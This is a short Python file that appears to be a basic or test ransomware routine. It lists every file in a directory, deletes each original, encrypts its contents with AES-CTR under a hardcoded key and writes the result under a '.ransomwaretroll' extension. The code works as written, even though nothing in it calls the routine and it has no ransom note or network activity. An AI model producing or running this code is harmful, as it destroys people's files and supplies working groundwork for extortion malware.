import os
import pyaes

def encrypt_directory(directory_path):
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path)

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    
    os.remove(file_path)

    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(file_data)

    new_file_path = file_path + ".ransomwaretroll"
    with open(new_file_path, 'wb') as new_file:
        new_file.write(encrypted_data)
